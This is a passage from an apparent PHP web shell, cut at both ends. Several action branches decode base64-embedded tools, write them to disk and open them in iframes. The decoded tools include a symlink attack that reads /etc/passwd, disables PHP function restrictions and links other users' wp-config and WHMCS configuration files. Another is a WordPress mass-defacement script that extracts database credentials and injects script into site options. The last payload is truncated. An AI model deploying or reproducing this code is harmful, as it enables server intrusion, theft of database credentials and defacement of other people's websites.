AxcHg7DQpjb2xvcjogUmVkOw0KYmFja2dyb3VuZC1jb2xvcjogQmxhY2s7DQp9DQoubWFpbiB7DQptYXJnaW4gICA6IC0yODdweCAwcHggMHB4IC00OTBweDsNCkJPUkRFUjogZGFzaGVkIDFweCAjMzMzOw0KQk9SREVSLUNPTE9SOiAjMzMzMzMzOw0KfQ0KLnR0IHsNCmJhY2tncm91bmQtY29sb3I6IEJsYWNrOw0KfQ0KDQpBOmxpbmsgew0KIENPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOnZpc2l0ZWQgew0KIENPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCiBjb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCiBjb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCjwvU1RZTEU+DQo8c2NyaXB0IGxhbmd1YWdlPVwnamF2YXNjcmlwdFwnPg0KZnVuY3Rpb24gaGlkZV9kaXYoaWQpDQp7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5ID0gXCdub25lXCc7DQogIGRvY3VtZW50LmNvb2tpZT1pZCtcJz0wO1wnOw0KfQ0KZnVuY3Rpb24gc2hvd19kaXYoaWQpDQp7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5ID0gXCdibG9ja1wnOw0KICBkb2N1bWVudC5jb29raWU9aWQrXCc9MTtcJzsNCn0NCmZ1bmN0aW9uIGNoYW5nZV9kaXZzdChpZCkNCnsNCiAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5ID09IFwnbm9uZVwnKQ0KICAgIHNob3dfZGl2KGlkKTsNCiAgZWxzZQ0KICAgIGhpZGVfZGl2KGlkKTsNCn0NCjwvc2NyaXB0Pic7ID8+DQo8aHRtbD4NCiA8aGVhZD4NCiAgPD9waHAgDQogIGVjaG8gJGhlYWQgOw0KICBlY2hvICcNCg0KPHRhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIGNsYXNzPSJ0YjEiID4NCg0KICAgDQoNCiAgICAgICA8dGQgd2lkdGg9IjEwMCUiIGFsaWduPWNlbnRlciB2YWxpZ249InRvcCIgcm93c3Bhbj0iMSI+DQogICAgICAgICAgIDxmb250IGNvbG9yPXJlZCBzaXplPTUgZmFjZT0iY29taWMgc2FucyBtcyI+PGI+LS09PVtbIFN5bSBsam5rIEFMbCBDb25GaWc8L2ZvbnQ+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT01IGZhY2U9ImNvbWljIHNhbnMgbXMiPjxiPiAgICsgU3ltIFJvb3QgPC9mb250Pjxmb250IGNvbG9yPWdyZWVuIHNpemU9NSBmYWNlPSJjb21pYyBzYW5zIG1zIj48Yj4gVGVhbSBieSBLeW0gTGpuayBdXT09LS08L2ZvbnQ+IDxkaXYgY2xhc3M9ImhlZHIiPiANCg0KICAgICAgICA8dGQgaGVpZ2h0PSIxMCIgYWxpZ249ImxlZnQiIGNsYXNzPSJ0ZDEiPjwvdGQ+PC90cj48dHI+PHRkIA0KICAgICAgICB3aWR0aD0iMTAwJSIgYWxpZ249ImNlbnRlciIgdmFsaWduPSJ0b3AiIHJvd3NwYW49IjEiPjxmb250IA0KICAgICAgICBjb2xvcj0icmVkIiBmYWNlPSJjb21pYyBzYW5zIG1zInNpemU9IjEiPjxiPiANCiAgICAgICAgICAgICANCiAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgDQoNCic7IA0KDQo/Pg0KPGNlbnRlcj4NCjxmb3JtIG1ldGhvZD1wb3N0Pjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPSJjb21pYyBzYW5zIG1zIj4xLiBDcmVhdCBwaHAuaW5pIGZpbGU8L2ZvbnQ+PHA+DQo8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1pbmkgdmFsdWU9InVzZSB0byBHZW5lcmF0ZSBQSFAuaW5pIiAvPjwvZm9ybT4NCjxmb3JtIG1ldGhvZD1wb3N0Pjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPSJjb21pYyBzYW5zIG1zIj4yLiBHZXQgdXNlcm5hbWVzIGZvciBzeW1saW5rPC9mb250PjxwPg0KIDxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPSJ1c3JlIiB2YWx1ZT0idXNlIHRvIEV4dHJhY3QgdXNlcm5hbWVzIiAvPjwvZm9ybT4NCiANCiA8P3BocA0KIGlmKGlzc2V0KCRfUE9TVFsnaW5pJ10pKQ0KIHsNCiAgDQogICRyPWZvcGVuKCdwaHAuaW5pJywndycpOw0KICAkcnI9IiBkaXNiYWxlX2Z1bmN0aW9ucz1ub25lICI7DQogIGZ3cml0ZSgkciwkcnIpOw0KICAkbGluaz0iPGEgaHJlZj1waHAuaW5pPjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPVwiY29taWMgc2FucyBtc1wiPjx1Pm9wZW4gUEhQLklOSTwvdT48L2ZvbnQ+PC9hPiI7DQogIGVjaG8gJGxpbms7IA0KICB9DQogPz4NCiA8P3BocA0KIGlmKGlzc2V0KCRfUE9TVFsndXNyZSddKSl7DQogID8+PGZvcm0gbWV0aG9kPXBvc3Q+DQogPHRleHRhcmVhIHJvd3M9MTAgY29scz01MCBuYW1lPXVzZXI+PD9waHAgICR1c2Vycz1maWxlKCIvZXRjL3Bhc3N3ZCIpOw0KZm9yZWFjaCgkdXNlcnMgYXMgJHVzZXIpDQp7DQokc3RyPWV4cGxvZGUoIjoiLCR1c2VyKTsNCmVjaG8gJHN0clswXS4iXG4iOw0KfQ0KDQo/PjwvdGV4dGFyZWE+PGJyPjxicj4NCiA8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zdSB2YWx1ZT0iTGV0cyBTdGFydCIgLz48L2Zvcm0+DQogPD9waHAgfSA/Pg0KIDw/cGhwDQogZXJyb3JfcmVwb3J0aW5nKG8pOw0KIGVjaG8gIjxmb250IGNvbG9yPXJlZCBzaXplPTIgZmFjZT1cImNvbWljIHNhbnMgbXNcIj4iOw0KIGlmKGlzc2V0KCRfUE9TVFsnc3UnXSkpDQogew0KIG1rZGlyKCdzeW0nLDA3NzcpOw0KJHJyICA9ICIgT3B0aW9ucyBhbGwgXG4gRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwgXG4gQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAgXG4gQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgXG4gIEFkZFR5cGUgdGV4dC9wbGFpbiAuaHRtbCBcbiBBZGRIYW5kbGVyIHR4dCAuaHRtbCBcbiBSZXF1aXJlIE5vbmUgXG4gU2F0aXNmeSBBbnkiOw0KJGcgPSBmb3Blbignc3ltLy5odGFjY2VzcycsJ3cnKTsNCmZ3cml0ZSgkZywkcnIpOw0KJFN5bSA9IHN5bWxpbmsoIi8iLCJzeW0vcm9vdCIpOw0KICAgICAgJHJ0PSI8YSBocmVmPXN5bS9yb290Pjxmb250IGNvbG9yPXdoaXRlIHNpemU9MyBmYWNlPVwiY29taWMgc2FucyBtc1wiPiBTeW08L2ZvbnQ+PC9hPiI7DQogICAgICAgIGVjaG8gIlJvb3QgLyBmb2xkZXIgc3ltbGluayA8YnI+PHU+JHJ0PC91PiI7DQogIA0KICAkZGlyPW1rZGlyKCdzeW0nLDA3NzcpOw0KICAkciAgPSAiIE9wdGlvbnMgYWxsIFxuIERpcmVjdG9yeUluZGV4IFN1eC5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCiAgICAgICAgJGYgPSBmb3Blbignc3ltLy5odGFjY2VzcycsJ3cnKTsNCiAgIA0KICAgICAgICBmd3JpdGUoJGYsJHIpOw0KICAgICAgICAkY29uc3ltPSI8YSBocmVmPXN5bS8+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+Y29uZmlndXJhdGlvbiBmaWxlczwvZm9udD48L2E+IjsNCiAgICAgICAgZWNobyAiPGJyPlN5bSBMam5rIEFsbCBDb25GaWcgPGJyPjx1Pjxmb250IGNvbG9yPXJlZCBzaXplPTIgZmFjZT1cImNvbWljIHNhbnMgbXNcIj4kY29uc3ltPC9mb250PjwvdT4iOw0KICAgICAgICANCiAgICAgICAgICR1c3I9ZXhwbG9kZSgiXG4iLCRfUE9TVFsndXNlciddKTsNCiAgICAgICAgJGNvbmZpZ3VyYXRpb249YXJyYXkoIndwLWNvbmZpZy5waHAiLCJ3b3JkcHJlc3Mvd3AtY29uZmlnLnBocCIsImNvbmZpZ3VyYXRpb24ucGhwIiwiYmxvZy93cC1jb25maWcucGhwIiwiam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwIiwidmIvaW5jbHVkZXMvY29uZmlnLnBocCIsImluY2x1ZGVzL2NvbmZpZy5waHAiLCJjb25mX2dsb2JhbC5waHAiLCJpbmMvY29uZmlnLnBocCIsImNvbmZpZy5waHAiLCJTZXR0aW5ncy5waHAiLCJzaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCIsIndobS9jb25maWd1cmF0aW9uLnBocCIsIndobWNzL2NvbmZpZ3VyYXRpb24ucGhwIiwic3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCIsIndobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwIiwid2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwIiwid2htL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwIiwic3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudHMvY29uZmlndXJhdGlvbi5waHAiLCJjbGllbnQvY29uZmlndXJhdGlvbi5waHAiLCJjbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudGUvY29uZmlndXJhdGlvbi5waHAiLCJjbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwIiwiYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCIsImFkbWluL2NvbmZpZy5waHAiKTsNCiAgZm9yZWFjaCgkdXNyIGFzICR1c3MgKQ0KICB7DQogICAkdXM9dHJpbSgkdXNzKTsNCiAgICAgIA0KICAgZm9yZWFjaCgkY29uZmlndXJhdGlvbiBhcyAkYykNCiAgIHsNCiAgICAkcnM9Ii9ob21lLyIuJHVzLiIvcHVibGljX2h0bWwvIi4kYzsNCiAgICAkcj0ic3ltLyIuJHVzLiIgLi4gIi4kYzsNCiAgICBzeW1saW5rKCRycywkcik7DQogICANCiAgfQ0KICAgDQogICB9DQogIA0KICANCiAgfQ0KIA0KIA0KIA0KID8+DQo8L2NlbnRlcj4=';
        $file       = fopen("symlink.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=symlink.php width=100% height=720px frameborder=0></iframe> ";
 }elseif ($action == 'star') {
        $file       = fopen($dir . "star.php", "w+");
        $perltoolss = 'PCEtLUF2M0xvWGlTIFdvcmRwcmVzcyBNYXNzRGVmYWNlLS0+IAkgICAgDQoJCQkNCgkJCQ0KCQkJPCEtLQ0KCQkJDQogICAjICAgICAgICAgICAgIyMjIyMgICMgICAgICAgICAgICAgICMgICAgICMgICAgIyMjIyMgIA0KICAjICMgICAjICAgICMgIyAgICAgIyAjICAgICAgICAjIyMjICAgIyAgICMgICMgIyAgICAgIyANCiAjICAgIyAgIyAgICAjICAgICAgICMgIyAgICAgICAjICAgICMgICAjICMgICAjICMgICAgICAgDQojICAgICAjICMgICAgIyAgIyMjIyMgICMgICAgICAgIyAgICAjICAgICMgICAgIyAgIyMjIyMgIA0KIyMjIyMjIyAjICAgICMgICAgICAgIyAjICAgICAgICMgICAgIyAgICMgIyAgICMgICAgICAgIyANCiMgICAgICMgICMgICMgICMgICAgICMgIyAgICAgICAjICAgICMgICMgICAjICAjICMgICAgICMgDQojICAgICAjICAgIyMgICAgIyMjIyMgICMjIyMjIyMgICMjIyMgICMgICAgICMgIyAgIyMjIyMgIA0KCQkJDQotLT4NCjxzdHlsZT4NCmJvZHkNCnsNCgliYWNrZ3JvdW5kOiAjMGYwZTBkOw0KCWNvbG9yOiAjMDBGRjAwOw0KCXBhZGRpbmc6IDBweDsNCn0NCmE6bGluaywgYm9keV9hbGluaw0Kew0KCWNvbG9yOiAjMDBGRjAwOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCn0NCmE6dmlzaXRlZCwgYm9keV9hdmlzaXRlZA0Kew0KCWNvbG9yOiAjMDBGRjAwOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCn0NCmE6aG92ZXIsIGE6YWN0aXZlLCBib2R5X2Fob3Zlcg0Kew0KCWNvbG9yOiAjMDBGRjAwOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCn0NCnRkLCB0aCwgcCwgbGksdGFibGUNCnsNCgkNCgliYWNrZ3JvdW5kOiAjMmUyYjI4Ow0KCWJvcmRlcjoxcHggc29saWQgIzUyNGY0NjsNCn0NCmlucHV0DQp7DQoJYm9yZGVyOiAxcHggc29saWQ7DQoJY3Vyc29yOiBkZWZhdWx0Ow0KCQ0KCW92ZXJmbG93OiBoaWRkZW47DQoJYmFja2dyb3VuZDogIzJlMmIyODsNCgljb2xvcjogIzAwRkYwMDsNCn10ZXh0YXJlYQ0Kew0KCWJvcmRlcjogMXB4IHNvbGlkOw0KCWN1cnNvcjogZGVmYXVsdDsNCgkNCglvdmVyZmxvdzogaGlkZGVuOw0KCWJhY2tncm91bmQ6ICMyZTJiMjg7DQoJY29sb3I6ICMwMEZGMDA7DQp9DQpidXR0b24NCnsNCglib3JkZXI6IDFweCBzb2xpZDsNCgljdXJzb3I6IGRlZmF1bHQ7DQoJDQoJb3ZlcmZsb3c6IGhpZGRlbjsNCgliYWNrZ3JvdW5kOiAjMmUyYjI4Ow0KCWNvbG9yOiAjZmZmZmZmOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCiANCjxib2R5IGJnY29sb3I9ImJsYWNrIj4NCjxwcmU+DQo8Y2VudGVyPjxhPjxpbWcgc3JjPSJodHRwOi8vYXYzbG94aXMuaG9sLmVzLzExMjIzMzQ0NTU2Njc3ODg5OTk5ODg3NzY2NTU0NDMzMjIxMTE1OTc1MzEyMzc4OTc0MTk2My9sb2dvLnBuZyI+PC9hPjwvY2VudGVyPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQo8L3ByZT4NCjxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiID4NCjxjZW50ZXI+DQo8dGFibGUgYm9yZGVyPScxJz48dHI+PHRkPlR1bSBTeW1saW5rIExpc3Rlc2kgOiA8L3RkPjx0ZD4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1cmwiIHNpemU9IjEwMCIgdmFsdWU9ImFzZC50eHQiPjwvdGQ+PC90cj4NCjx0cj48dGQ+SW5kZXggS29kbGFyaSA6IDwvdGQ+PHRkPg0KPHRleHRhcmVhIG5hbWU9ImluZGV4IiBjb2xzPSc1MCcgcm93cz0nMTAnID48L3RleHRhcmVhPjwvdGQ+PC90cj48L3RhYmxlPg0KPGJyPjxicj48aW5wdXQgdHlwZT0iU3VibWl0IiBuYW1lPSJTdWJtaXQiIHZhbHVlPSJTdWJtaXQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iMSI+PC9mb3JtPg0KDQo8ZGl2IGlkPSJpbWFnZTEyIiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IG92ZXJmbG93OmhpZGRlbjsgbGVmdDoxMTQ0cHg7IHRvcDo2MzNweDsgd2lkdGg6MzBweDsgaGVpZ2h0OjI4cHg7IHotaW5kZXg6MTIiPjxhIGhyZWY9Imh0dHA6Ly9hdjNsb3hpcy5ob2wuZXMiPjxpbWcgc3JjPSJodHRwOi8vYXYzbG94aXMuaG9sLmVzLzExMjIzMzQ0NTU2Njc3ODg5OTk5ODg3NzY2NTU0NDMzMjIxMTE1OTc1MzEyMzc4OTc0MTk2My9sb2dvLnBuZyIgYWx0PSIiIHRpdGxlPSIiIGJvcmRlcj0iMCIgd2lkdGg9IjMwIiBoZWlnaHQ9IjI4Ij48L2E+PC9kaXY+DQoNCjwvZGl2Pg0KPC9jZW50ZXI+DQo8Pw0Kc2V0X3RpbWVfbGltaXQoMCk7DQppZiAoJF9QT1NUWydhY3Rpb24nXT09JzEnKXsNCiR1cmw9JF9QT1NUWyd1cmwnXTsNCiR1c2Vycz1AZmlsZSgkdXJsKTsNCiANCiANCmlmIChjb3VudCgkdXNlcnMpPDEpIGV4aXQoIjxoMT5ObyBjb25maWcgZm91bmQ8L2gxPiIpOw0KZm9yZWFjaCAoJHVzZXJzIGFzICR1c2VyKSB7DQokdXNlcjE9dHJpbSgkdXNlcik7DQokY29kZT1maWxlX2dldF9jb250ZW50czIoJHVzZXIxKTsNCnByZWdfbWF0Y2hfYWxsKCd8ZGVmaW5lLipcKC4qXCdEQl9OQU1FXCcuKiwuKlwnKC4qKVwnLipcKS4qO3xpc1UnLCRjb2RlLCRiMSk7DQokZGI9JGIxWzFdWzBdOw0KcHJlZ19tYXRjaF9hbGwoJ3xkZWZpbmUuKlwoLipcJ0RCX1VTRVJcJy4qLC4qXCcoLiopXCcuKlwpLio7fGlzVScsJGNvZGUsJGIyKTsNCiR1c2VyPSRiMlsxXVswXTsNCnByZWdfbWF0Y2hfYWxsKCd8ZGVmaW5lLipcKC4qXCdEQl9QQVNTV09SRFwnLiosLipcJyguKilcJy4qXCkuKjt8aXNVJywkY29kZSwkYjMpOw0KJGRiX3Bhc3N3b3JkPSRiM1sxXVswXTsNCnByZWdfbWF0Y2hfYWxsKCd8ZGVmaW5lLipcKC4qXCdEQl9IT1NUXCcuKiwuKlwnKC4qKVwnLipcKS4qO3xpc1UnLCRjb2RlLCRiNCk7DQokaG9zdD0kYjRbMV1bMF07DQpwcmVnX21hdGNoX2FsbCgnfFwkdGFibGVfcHJlZml4Lio9LipcJyguKilcJy4qO3xpc1UnLCRjb2RlLCRiNSk7DQokcD0kYjVbMV1bMF07DQogDQogDQokZD1AbXlzcWxfY29ubmVjdCggJGhvc3QsICR1c2VyLCAkZGJfcGFzc3dvcmQgKSA7DQppZiAoJGQpew0KQG15c3FsX3NlbGVjdF9kYigkZGIgKTsNCiRzb3VyY2U9c3RyaXBzbGFzaGVzKCRfUE9TVFsnaW5kZXgnXSk7DQokczI9c3RyVG9IZXgoKCRzb3VyY2UpKTsNCiRzPSI8c2NyaXB0PmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwgPSB1bmVzY2FwZSgnJyRzMicnKTs8L3NjcmlwdD4iOw0KJGxzPXN0cmxlbigkcyktMjsNCiRzcWw9InVwZGF0ZSAiLiRwLiJvcHRpb25zIHNldCBvcHRpb25fdmFsdWU9J2E6Mjp7aToyO2E6Mzp7czo1OlwidGl0bGVcIjtzOjA6XCJcIjtzOjQ6XCJ0ZXh0XCI7czokbHM6XCIkc1wiO3M6NjpcImZpbHRlclwiO2I6MDt9czoxMjpcIl9tdWx0aXdpZGdldFwiO2k6MTt9JyB3aGVyZSBvcHRpb25fbmFtZT0nd2lkZ2V0X3RleHQnOyAiOw0KbXlzcWxfcXVlcnkoJHNxbCkgOw0KJHNxbD0idXBkYXRlICIuJHAuIm9wdGlvbnMgc2V0IG9wdGlvbl92YWx1ZT0nYTo3OntzOjE5Olwid3BfaW5hY3RpdmVfd2lkZ2V0c1wiO2E6Njp7aTowO3M6MTA6XCJhcmNoaXZlcy0yXCI7aToxO3M6NjpcIm1ldGEtMlwiO2k6MjtzOjg6XCJzZWFyY2gtMlwiO2k6MztzOjEyOlwiY2F0ZWdvcmllcy0yXCI7aTo0O3M6MTQ6XCJyZWNlbnQtcG9zdHMtMlwiO2k6NTtzOjE3OlwicmVjZW50LWNvbW1lbnRzLTJcIjt9czo5Olwic2lkZWJhci0xXCI7YToxOntpOjA7czo2OlwidGV4dC0yXCI7fXM6OTpcInNpZGViYXItMlwiO2E6MDp7fXM6OTpcInNpZGViYXItM1wiO2E6MDp7fXM6OTpcInNpZGViYXItNFwiO2E6MDp7fXM6OTpcInNpZGViYXItNVwiO2E6MDp7fXM6MTM6XCJhcnJheV92ZXJzaW9uXCI7aTozO30nIHdoZXJlIG9wdGlvbl9uYW1lPSdzaWRlYmFyc193aWRnZXRzJzsiOw0KbXlzcWxfcXVlcnkoJHNxbCkgOw0KaWYgKGZ1bmN0aW9uX2V4aXN0cygibWJfY29udmVydF9lbmNvZGluZyIpICkNCnsNCiRzb3VyY2UyID0gbWJfY29udmVydF9lbmNvZGluZygnPC90aXRsZT4nLiRzb3VyY2UuJzxESVYgc3R5bGU9IkRJU1BMQVk6IG5vbmUiPjx4bXA+JywgJ1VURi03Jyk7DQokc291cmNlMj1teXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJHNvdXJjZTIpOw0KJHNxbCA9ICJVUERBVEUgYCIuJHAuIm9wdGlvbnNgIFNFVCBgb3B0aW9uX3ZhbHVlYCA9ICckc291cmNlMicgV0hFUkUgYG9wdGlvbl9uYW1lYCA9ICdibG9nbmFtZSc7IjsNCkBteXNxbF9xdWVyeSgkc3FsKSA7IDsNCiRzcWw9ICJVUERBVEUgYCIuJHAuIm9wdGlvbnNgIFNFVCBgb3B0aW9uX3ZhbHVlYCA9ICdVVEYtNycgV0hFUkUgYG9wdGlvbl9uYW1lYCA9ICdibG9nX2NoYXJzZXQnOyI7DQpAbXlzcWxfcXVlcnkoJHNxbCkgOyA7DQp9DQokYWE9QG15c3FsX3F1ZXJ5KCJzZWxlY3Qgb3B0aW9uX3ZhbHVlIGZyb20gYCIuJHAuIm9wdGlvbnNgIFdIRVJFIGBvcHRpb25fbmFtZWAgPSAnc2l0ZXVybCc7IikgOzsNCiRzaXRldXJsPUBteXNxbF9mZXRjaF9hcnJheSgkYWEpIDsNCiRzaXRldXJsPSRzaXRldXJsWydvcHRpb25fdmFsdWUnXTsNCiR0ci49IiRzaXRldXJsXG4iOw0KbXlzcWxfY2xvc2UoKTsNCn0NCn0NCmlmICgkdHIpIGVjaG8gIkluZGV4IGNoYW5nZWQgZm9yIDxicj48YnI+PHRleHRhcmVhIGNvbHM9JzUwJyByb3dzPScxMCcgPiR0cjwvdGV4dGFyZWE+IjsNCn0NCmZ1bmN0aW9uIHN0clRvSGV4KCRzdHJpbmcpDQp7DQogICAgJGhleD0nJzsNCiAgICBmb3IgKCRpPTA7ICRpIDwgc3RybGVuKCRzdHJpbmcpOyAkaSsrKQ0KICAgIHsNCiAgICAgICAgaWYgKHN0cmxlbihkZWNoZXgob3JkKCRzdHJpbmdbJGldKSkpPT0xKXsNCiAgICAgICAgJGhleCAuPSIlMCIuIGRlY2hleChvcmQoJHN0cmluZ1skaV0pKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkaGV4IC49IiUiLiBkZWNoZXgob3JkKCRzdHJpbmdbJGldKSk7DQogICAgICAgICAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGhleDsNCn0NCiANCmZ1bmN0aW9uIGZpbGVfZ2V0X2NvbnRlbnRzMigkdSl7DQogDQogICAgICAgICRjaCA9IGN1cmxfaW5pdCgpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1VSTCwkdSk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOyAgICANCiAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLHRydWUpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1VTRVJBR0VOVCwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6MTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMi4wICIpOw0KICAgICAgICAgICAgJHJlc3VsdCA9IGN1cmxfZXhlYygkY2gpOw0KICAgICAgICByZXR1cm4gJHJlc3VsdCA7DQogICAgICAgIH0NCiAgICAgICANCj8+';
        $file       = fopen("star.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=star.php width=100% height=720px frameborder=0></iframe> ";
 }elseif ($action == 'basson') {
        $file       = fopen($dir . "basson.php", "w+");
        $perltoolss = 'PGh0bWw+PGJvZHkgYmdjb2xvcj0iYmxhY2siPjxjZW50ZXI+PGJyPjxoMz48Zm9udCBjb2xvcj0nd2hpdGUnPkJhc2EgVmUgU29uYSBLb2QgRWtsZXlpY2k8L2ZvbnQ+PC9oMz48YnI+PGZvcm0gbWV0aG9kPSdwb3N0JyBhY3Rpb249Jyc+PGJyPjx0ZXh0YXJlYSBuYW1lPSdBdjNMb1hpUycgc3R5bGU9J2hlaWdodDogMjA0cHg7IHdpZHRoOiA1NzFweCc+PC90ZXh0YXJlYT48YnI+PGJyPjxmb250IGNvbG9yPSdyZWQnPkJhcyBLaXNtYSBFa2xlPC9mb250PiAgPGZvbnQgY29sb3I9J3doaXRlJz49PC9mb250PiAgPGlucHV0IG5hbWU9J2JhcycgdHlwZT0ndGV4dCc+PGJyPjxmb250IGNvbG9yPSdyZWQnPlNvbiBLaXNtYSBFa2xlPC9mb250PiAgPGZvbnQgY29sb3I9J3doaXRlJz49PC9mb250PiAgPGlucHV0IG5hbWU9J3NvbicgdHlwZT0ndGV4dCc+PGJyPjxicj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0iRWtMZSI+PGJyPjwvY2VudGVyPjwvZm9ybT48L2h0bWw+DQo8P3BocA0KJEF2M0xvWGlTID0gJF9QT1NUWydBdjNMb1hpUyddOw0KJGJhcyA9ICRfUE9TVFsnYmFzJ107DQokc29uID0gJF9QT1NUWydzb24nXTsNCiRBdjNMb1hpUyA9IGV4cGxvZGUoIlxuIiwkQXYzTG9YaVMpOw0KZm9yZWFjaCgkQXYzTG9YaVMgYXMgJG1ldGFsKXsgDQokbWV0YWwgPSB0cmltKCRtZXRhbCk7DQplY2hvICI8Y2VudGVyPjxmb250IGNvbG9yPWdyZWVuPiIuJGJhcy4kbWV0YWwuJHNvbi4iPGJyPjwvY2VudGVyPiI7DQp9DQo/Pg==';
        $file       = fopen("basson.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=basson.php width=100% height=720px frameborder=0></iframe> ";
 }elseif ($action == 'bypass') {
        $file       = fopen($dir . "bypass.php", "w+");
        $perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+DQo8aHRtbD4NCjwhLS1JdHMgRmlyc3QgUHVibGljIFZlcnNpb24gDQoNCiAtLT4NCjwvaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSdDb250ZW50LVR5cGUnIGNvbnRlbnQ9J3RleHQvaHRtbDsgY2hhcnNldD11dGYtOCc+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYSB7IA0KdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQpjb2xvcjp3aGl0ZTsNCiB9DQo8L3N0eWxlPiANCjxzdHlsZT4NCmlucHV0IHsgDQpjb2xvcjojMDAwMDM1OyANCmZvbnQ6OHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOw0KfQ0KLkRJUiB7IA0KY29sb3I6IzAwMDAzNTsgDQpmb250OmJvbGQgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmO2NvbG9yOiNGRkZGRkY7DQpiYWNrZ3JvdW5kLWNvbG9yOiNBQTAwMDA7DQpib3JkZXItc3R5bGU6bm9uZTsNCn0NCi50eHQgeyANCmNvbG9yOiMyQTAwMDA7IA0KZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7DQp9IA0KYm9keSwgdGFibGUsIHNlbGVjdCwgb3B0aW9uLCAuaW5mbw0Kew0KZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7DQp9DQpib2R5IHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjRTVFNUU1Ow0KfQ0KLnN0eWxlMSB7Y29sb3I6ICNBQTAwMDB9DQoudGQNCnsNCmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7DQpib3JkZXItdG9wOiAwcHg7DQpib3JkZXItbGVmdDogMHB4Ow0KYm9yZGVyLXJpZ2h0OiAwcHg7DQp9DQoudGRVUA0Kew0KYm9yZGVyOiAxc